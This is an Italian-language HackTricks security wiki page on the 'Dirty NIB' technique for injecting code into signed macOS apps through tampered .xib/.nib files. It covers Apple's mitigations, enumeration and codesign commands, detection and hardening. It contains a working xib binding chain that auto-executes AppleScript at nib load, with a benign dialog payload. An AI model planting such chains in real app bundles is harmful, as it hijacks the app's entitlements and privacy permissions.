# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB si riferisce all’abuso dei file Interface Builder (.xib/.nib) all’interno del bundle di un’app macOS firmata per eseguire logica controllata dall’attaccante all’interno del processo target, ereditandone così gli entitlements e i permessi TCC. Questa tecnica è stata documentata originariamente da xpn (MDSec) e in seguito generalizzata e significativamente ampliata da Sector7, che ha anche illustrato le mitigazioni di Apple in macOS 13 Ventura e macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Per informazioni di base e analisi approfondite, consulta i riferimenti alla fine.

> TL;DR
> • Prima di macOS 13 Ventura: sostituire il MainMenu.nib di un bundle (o un altro nib caricato all’avvio) poteva consentire in modo affidabile l’iniezione nel processo e spesso l’escalation dei privilegi.
> • A partire da macOS 13 (Ventura), con ulteriori miglioramenti in macOS 14 (Sonoma): la verifica approfondita al primo avvio, la protezione dei bundle, i Launch Constraints e il nuovo permesso TCC “App Management” impediscono in gran parte il nib tampering dopo l’avvio da parte di app non correlate. Gli attacchi possono comunque essere possibili in casi specifici (ad esempio, strumenti dello stesso developer che modificano le proprie app oppure terminali a cui l’utente ha concesso App Management/Full Disk Access).

## Cosa sono i file NIB/XIB

I file Nib (abbreviazione di NeXT Interface Builder) sono grafi di oggetti UI serializzati utilizzati dalle app AppKit. Xcode moderno memorizza i file XML .xib modificabili, che vengono compilati in .nib durante la build. Un’app tipica carica la propria UI principale tramite `NSApplicationMain()`, che legge la chiave `NSMainNibFile` dall’Info.plist dell’app e istanzia il grafo di oggetti durante l’esecuzione.

Punti chiave che rendono possibile l’attacco:
- Il caricamento dei NIB istanzia classi Objective-C arbitrarie senza richiedere che siano conformi a NSSecureCoding (il nib loader di Apple utilizza come fallback `init`/`initWithFrame:` quando `initWithCoder:` non è disponibile).
- I Cocoa Bindings possono essere abusati per chiamare metodi durante l’istanziazione dei nib, incluse chiamate concatenate che non richiedono alcuna interazione dell’utente.


## Processo di Dirty NIB injection (prospettiva dell’attaccante)

Il flusso classico precedente a Ventura:
1) Creare un .xib malevolo
- Aggiungere un oggetto `NSAppleScript` (o altre classi “gadget”, come `NSTask`).
- Aggiungere un `NSTextField` il cui title contiene il payload (ad esempio AppleScript o argomenti di comando).
- Aggiungere uno o più oggetti `NSMenuItem` collegati tramite bindings per chiamare metodi sull’oggetto target.

2) Attivazione automatica senza click dell’utente
- Utilizzare i bindings per impostare il target/selector di una voce di menu e quindi invocare il metodo privato `_corePerformAction`, in modo che l’action venga eseguita automaticamente al caricamento del nib. In questo modo non è necessario che l’utente faccia clic su un pulsante.

Esempio minimo di una catena auto-trigger all’interno di un .xib (abbreviato per chiarezza):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Questa tecnica consente l'esecuzione arbitraria di AppleScript nel processo target al caricamento del nib.<sup>[[1]](#references)</sup> Le chain avanzate possono:
- Istanziare classi AppKit arbitrarie (ad esempio, `NSTask`) e chiamare metodi senza argomenti come `-launch`.
- Chiamare selector arbitrari con argomenti oggetto tramite la tecnica del binding descritta sopra.
- Caricare AppleScriptObjC.framework per creare un bridge verso Objective-C e chiamare persino API C selezionate.
- Sui sistemi meno recenti che includono ancora Python.framework, creare un bridge verso Python e usare quindi `ctypes` per chiamare funzioni C arbitrarie (ricerca di Sector7).<sup>[[2]](#references)</sup>

3) Sostituire il nib dell'app
- Copiare target.app in una posizione scrivibile, sostituire ad esempio `Contents/Resources/MainMenu.nib` con il nib malevolo ed eseguire target.app. Prima di Ventura, dopo una valutazione iniziale una tantum da parte di Gatekeeper, gli avvii successivi eseguivano solo controlli superficiali della firma, quindi le risorse non eseguibili (come i file .nib) non venivano convalidate nuovamente.

Esempio di payload AppleScript per un test visibile:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protezioni moderne di macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple ha introdotto diverse mitigazioni sistemiche che riducono drasticamente la fattibilità di Dirty NIB su macOS moderno:<sup>[[2]](#references)</sup>
- Verifica approfondita al primo avvio e protezione del bundle (macOS 13 Ventura)
- Al primo avvio di qualsiasi app (in quarantena o meno), una verifica approfondita della firma copre tutte le risorse del bundle. In seguito, il bundle diventa protetto: solo le app dello stesso sviluppatore (o esplicitamente autorizzate dall’app) possono modificarne i contenuti. Le altre app richiedono il nuovo permesso TCC “App Management” per scrivere nel bundle di un’altra app.
- Launch Constraints (macOS 13 Ventura)
- Le app di sistema/in bundle Apple non possono essere copiate altrove ed eseguite; questo blocca l’approccio “copia in /tmp, applica la patch, esegui” per le app del sistema operativo.
- Miglioramenti in macOS 14 Sonoma
- Apple ha rafforzato App Management e corretto bypass noti (ad es. CVE‑2023‑40450) segnalati da Sector7. Python.framework è stato rimosso in precedenza (macOS 12.3), interrompendo alcune catene di privilege escalation.
- Modifiche a Gatekeeper/Quarantine
- Per una discussione più ampia su Gatekeeper, provenienza e modifiche alla valutazione che hanno avuto un impatto su questa tecnica, consulta la pagina indicata di seguito.

> Implicazione pratica
> • Su Ventura+ generalmente non è possibile modificare il file .nib di un’app di terze parti, a meno che il processo non disponga di App Management o non sia firmato con lo stesso Team ID dell’obiettivo (ad es. strumenti per sviluppatori).
> • Concedere App Management o Full Disk Access a shell/terminali riapre di fatto questa superficie d’attacco per qualsiasi elemento in grado di eseguire codice nel contesto di quel terminale.


### Addressing Launch Constraints

Launch Constraints impediscono l’esecuzione di molte app Apple da posizioni non predefinite a partire da Ventura. Se facevi affidamento su workflow precedenti a Ventura, come copiare un’app Apple in una directory temporanea, modificare `MainMenu.nib` ed eseguirla, aspettati che non funzionino su >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Individua le app la cui interfaccia utente è basata su nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Trova le risorse nib candidate all'interno di un bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Convalida in profondità le firme del codice (fallirà se hai manomesso le risorse e non le hai rifirmate):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: sulle versioni moderne di macOS sarai inoltre bloccato dalla protezione dei bundle/TCC quando tenti di scrivere nel bundle di un’altra app senza la corretta autorizzazione.


## Suggerimenti per il rilevamento e il DFIR

- Monitoraggio dell’integrità dei file sulle risorse dei bundle
- Controlla le modifiche a mtime/ctime di `Contents/Resources/*.nib` e di altre risorse non eseguibili nelle app installate.
- Unified logs e comportamento dei processi
- Monitora l’esecuzione imprevista di AppleScript all’interno delle app GUI e i processi che caricano AppleScriptObjC o Python.framework. Esempio:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Valutazioni proattive
- Esegui periodicamente `codesign --verify --deep` sulle app critiche per assicurarti che le risorse rimangano integre.
- Contesto dei privilegi
- Verifica chi o cosa dispone dell’autorizzazione TCC “App Management” o dell’accesso completo al disco (in particolare terminali e agenti di gestione). La rimozione di queste autorizzazioni dalle shell generiche impedisce di riattivare facilmente manomissioni in stile Dirty NIB.


## Hardening difensivo (sviluppatori e difensori)

- Preferisci UI programmatiche oppure limita ciò che viene istanziato dai nib. Evita di includere classi potenti (ad esempio `NSTask`) nei grafi nib ed evita binding che invocano indirettamente selettori su oggetti arbitrari.
- Adotta l’hardened runtime con Library Validation (già standard nelle app moderne). Sebbene ciò non impedisca di per sé l’iniezione nei nib, blocca il caricamento semplice di codice nativo e costringe gli aggressori a usare payload esclusivamente basati su scripting.
- Non richiedere né utilizzare ampie autorizzazioni App Management negli strumenti generici. Se MDM richiede App Management, separa tale contesto dalle shell gestite dall’utente.
- Verifica regolarmente l’integrità del bundle della tua app e fai in modo che i meccanismi di aggiornamento ripristinino automaticamente le risorse del bundle.


## Letture correlate in HackTricks

Scopri di più su Gatekeeper, quarantine e sulle modifiche alla provenienza che influenzano questa tecnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Riferimenti

- [1] [xpn – DirtyNIB (write-up originale con l’esempio di Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 aprile 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
